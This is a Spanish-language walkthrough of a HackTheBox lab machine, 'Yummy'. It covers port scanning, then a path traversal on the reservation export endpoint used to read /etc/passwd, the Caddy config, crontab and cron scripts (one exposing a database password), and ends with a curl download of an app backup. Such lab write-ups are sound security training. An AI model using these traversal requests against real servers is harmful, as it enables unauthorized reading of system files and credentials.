<div align=center>
  <img src="https://github.com/user-attachments/assets/a475c06b-f2dc-4c07-91d7-bf7e2bcaa6d4" width="500">
</div>

```bash
ping -c 1 10.10.11.36 -R

PING 10.10.11.36 (10.10.11.36) 56(124) bytes of data.
64 bytes from 10.10.11.36: icmp_seq=1 ttl=63 time=176 ms
RR: 	10.10.14.191
	10.10.10.2
	10.10.11.36
	10.10.11.36
	10.10.14.1
	10.10.14.191

--- 10.10.11.36 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 175.923/175.923/175.923/0.000 ms
```

TTL 63: Máquina Linux

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.36 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
nmap -p22,80 -sCV 10.10.11.36 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2ed6577e9c42f134919b0b809eb5636 (ECDSA)
|_  256 bcdf25355c9724f269b4ce6017503cf0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-title: Yummy
|_http-server-header: Caddy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregar al archivo `/etc/hosts` `10.10.11.36 yummy.htb`

```bash
whatweb http://yummy.htb

http://yummy.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@yummy.htb], Frame, HTML5, HTTPServer[Caddy], IP[10.10.11.36], Lightbox, Script, Title[Yummy]
```

Registrar usuario

Loguearse

Reservar mesa

Descargar archivo `.ics`

```bash
file Yummy_reservation_20250224_215007.ics

Yummy_reservation_20250224_215007.ics: vCalendar calendar file
```

```bash
exiftool Yummy_reservation_20250224_215007.ics

ExifTool Version Number         : 12.57
File Name                       : Yummy_reservation_20250224_215007.ics
Directory                       : .
File Size                       : 268 bytes
File Modification Date/Time     : 2025:02:24 18:50:08-03:00
File Access Date/Time           : 2025:02:24 18:50:19-03:00
File Inode Change Date/Time     : 2025:02:24 18:50:11-03:00
File Permissions                : -rw-r--r--
File Type                       : ICS
File Type Extension             : ics
MIME Type                       : text/calendar
VCalendar Version               : 2.0
Software                        : ics.py - http://git.io/lLljaA
Description                     : Email: test@test.com.Number of People: 1.Message: test
Date Time Start                 : 2025:02:24 00:00:00Z
Summary                         : test
UID                             : 74907f64-f16d-4271-a2b8-b8c1c6d6919e@7490.org
```

Interceptar la solicitud de descarga del archivo `.ics` con Burpsuite

```
GET /reminder/21 HTTP/1.1
Host: yummy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://yummy.htb/dashboard
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Click derecho, seleccionar `Do intercept`, `Response to this request`. `Forward`.

```
GET /export/Yummy_reservation_20250224_220158.ics HTTP/1.1
Host: yummy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://yummy.htb/dashboard
Connection: keep-alive
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.Z7zsVg.eSAfX5kAP-XFZi_QJww4Js6lUWY
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Modificar la ruta `/export/../../../../../../../etc/passwd`. En la primer respuesta del servidor se ve el archivo, si se hace una segunda vez el servidor arroja un error.

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=passwd
Content-Length: 2033
Content-Type: application/octet-stream
Date: Mon, 24 Feb 2025 21:59:00 GMT
Etag: "1727686952.3123646-2033-2190675592"
Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
Server: Caddy

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false
```

Caddy config files `/etc/caddy/Caddyfile`

Modificar la solicitud para ver el archivo de configuración de Caddy

```
https://caddyserver.com/docs/conventions#your-config-files
```

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=Caddyfile
Content-Length: 178
Content-Type: application/octet-stream
Date: Mon, 24 Feb 2025 22:11:10 GMT
Etag: "1715978794.806761-178-521933300"
Last-Modified: Fri, 17 May 2024 20:46:34 GMT
Server: Caddy

:80 {
    @ip {
        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
    }
    redir @ip http://yummy.htb{uri}
    reverse_proxy 127.0.0.1:3000 {
    header_down -Server  
    }
}
```

Obtener el archivo `/etc/crontab`

```
GET /export/../../../../../../../../etc/crontab HTTP/1.1
```

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=crontab
Content-Length: 1308
Content-Type: application/octet-stream
Date: Mon, 24 Feb 2025 22:16:24 GMT
Etag: "1726753214.5820017-1308-2418282194"
Last-Modified: Thu, 19 Sep 2024 13:40:14 GMT
Server: Caddy

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

Archivo `/data/scripts/app_backup.sh`

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=app_backup.sh
Content-Length: 90
Content-Type: text/x-sh; charset=utf-8
Date: Mon, 24 Feb 2025 22:22:49 GMT
Etag: "1727364692.0530195-90-57808346"
Last-Modified: Thu, 26 Sep 2024 15:31:32 GMT
Server: Caddy

#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/
```

Archivo `/data/scripts/table_cleanup.sh`

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=table_cleanup.sh
Content-Length: 114
Content-Type: text/x-sh; charset=utf-8
Date: Mon, 24 Feb 2025 22:23:46 GMT
Etag: "1727364676.2200189-114-4196800022"
Last-Modified: Thu, 26 Sep 2024 15:31:16 GMT
Server: Caddy

#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
```

Archivo `/data/scripts/dbmonitor.sh`

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=dbmonitor.sh
Content-Length: 1336
Content-Type: text/x-sh; charset=utf-8
Date: Mon, 24 Feb 2025 22:24:36 GMT
Etag: "1727364676.2020187-1336-3434681599"
Last-Modified: Thu, 26 Sep 2024 15:31:16 GMT
Server: Caddy

#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```
Archivo `/var/www/backupapp.zip`

```bash
curl -s --cookie 'X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU65GqMrQUAdo0urg.Z7z0-g.QVEAlJv72-mH4aAeX6dV4PxTiXs' -X GET 'http://yummy.htb/export/../../../../../../../var/www/backupapp.zip' --path-as-is --output backupapp.zip
```

